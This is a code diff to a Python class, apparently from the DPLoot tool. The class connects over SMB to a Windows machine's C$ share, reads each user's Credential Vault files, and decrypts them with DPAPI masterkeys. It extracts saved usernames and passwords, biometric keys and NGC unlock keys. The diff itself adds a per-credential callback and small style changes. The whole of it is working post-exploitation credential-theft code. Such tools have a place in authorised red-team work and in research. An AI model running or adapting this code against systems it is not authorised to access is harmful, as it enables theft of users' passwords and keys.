@@ -64,7 +64,7 @@ class VaultsTriage:
     share = 'C$'
     vpol_filename = 'Policy.vpol'
 
-    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey]) -> None:
+    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: List[Masterkey], per_vault_callback: Any = None) -> None:
         self.target = target
         self.conn = conn
         
@@ -72,8 +72,10 @@ class VaultsTriage:
         self.looted_files = dict()
         self.masterkeys = masterkeys
 
+        self.per_vault_callback = per_vault_callback
+
     def triage_system_vaults(self) -> List[VaultCred]:
-        vaults_creds = list()
+        vaults_creds = []
         vault_dirs = self.conn.listDirs(self.share, self.system_vault_generic_path)
         for system_vault_path,system_vault_dir in vault_dirs.items():
             if system_vault_dir is not None:
@@ -81,7 +83,7 @@ class VaultsTriage:
         return vaults_creds
 
     def triage_vaults(self) -> List[VaultCred]:
-        vaults_creds = list()
+        vaults_creds = []
         for user in self.users:
             try:
                 vaults_creds += self.triage_vaults_for_user(user) 
@@ -94,7 +96,7 @@ class VaultsTriage:
         return vaults_creds
 
     def triage_vaults_for_user(self, user:str) -> List[VaultCred]:
-        vaults_creds = list()
+        vaults_creds = []
         vault_dirs = self.conn.listDirs(self.share, [elem % user for elem in self.user_vault_generic_path])
         for user_vault_path,user_vault_dir in vault_dirs.items():
             if user_vault_dir is not None:
@@ -102,7 +104,7 @@ class VaultsTriage:
         return vaults_creds
 
     def triage_vaults_folder(self, user, vaults_folder_path, vaults_folder) -> List[VaultCred]:
-        vaults_creds = list()
+        vaults_creds = []
         for d in vaults_folder:
             if is_guid(d.get_longname()) and d.is_directory()>0:
                 vault_dirname = d.get_longname()
@@ -112,7 +114,7 @@ class VaultsTriage:
                 # read vpol blob
                 vpol_filepath = ntpath.join(vault_directory_path,self.vpol_filename)
                 vpolblob_bytes = self.conn.readFile(self.share,vpol_filepath)
-                vpol_keys = list()
+                vpol_keys = []
                 if vpolblob_bytes is not None and self.masterkeys is not None:
                     self.looted_files[vault_dirname + '_' + self.vpol_filename] = vpolblob_bytes    
                     masterkey = find_masterkey_for_vpol_blob(vpolblob_bytes, self.masterkeys)
@@ -145,10 +147,11 @@ class VaultsTriage:
                             vault = decrypt_vcrd(vrcd_bytes, vpol_keys)
                             try:
                                 if isinstance(vault, (VAULT_INTERNET_EXPLORER, VAULT_WIN_BIO_KEY, VAULT_NGC_ACCOOUNT)):
+                                    vault_cred = None
                                     if isinstance(vault, VAULT_INTERNET_EXPLORER):
-                                        vaults_creds.append(VaultCred(winuser=user, blob=vault, type=type(vault), username=vault['Username'].decode('utf-16le'),resource=vault['Resource'].decode('utf-16le'), password=vault['Password'].decode('utf-16le') ))
+                                        vault_cred = VaultCred(winuser=user, blob=vault, type=type(vault), username=vault['Username'].decode('utf-16le'),resource=vault['Resource'].decode('utf-16le'), password=vault['Password'].decode('utf-16le') )
                                     elif isinstance(vault, VAULT_WIN_BIO_KEY):
-                                        vaults_creds.append(VaultCred(winuser=user, blob=vault, type=type(vault), sid=RPC_SID(b'\x05\x00\x00\x00'+vault['Sid']).formatCanonical(), friendly_name=vault['Name'].decode('utf-16le'), biometric_key=(hexlify(vault['BioKey']['bKey'])).decode('latin-1')))
+                                        vault_cred = VaultCred(winuser=user, blob=vault, type=type(vault), sid=RPC_SID(b'\x05\x00\x00\x00'+vault['Sid']).formatCanonical(), friendly_name=vault['Name'].decode('utf-16le'), biometric_key=(hexlify(vault['BioKey']['bKey'])).decode('latin-1'))
                                     elif isinstance(vault, VAULT_NGC_ACCOOUNT):
                                         # take non existing keys into account
                                         try:
@@ -167,7 +170,12 @@ class VaultsTriage:
                                             cipher_text = hexlify(vault["CipherText"])
                                         except KeyError:
                                             cipher_text = None
-                                        vaults_creds.append(VaultCred(winuser=user, blob=vault, type=type(vault), sid=RPC_SID(b'\x05\x00\x00\x00'+vault['Sid']).formatCanonical(), friendly_name=vault['Name'].decode('utf-16le'), biometric_key=biometric_key, unlock_key=unlock_key, IV=iv, cipher_text=cipher_text))
+
+                                        vault_cred = VaultCred(winuser=user, blob=vault, type=type(vault), sid=RPC_SID(b'\x05\x00\x00\x00'+vault['Sid']).formatCanonical(), friendly_name=vault['Name'].decode('utf-16le'), biometric_key=biometric_key, unlock_key=unlock_key, IV=iv, cipher_text=cipher_text)
+                                    if vault_cred is not None:
+                                        vaults_creds.append(vault_cred)
+                                        if self.per_vault_callback is not None:
+                                            self.per_vault_callback(vault_cred)
                                 else:
                                     logging.debug('Vault decrypted but unknown data structure:')
                             except Exception as e:
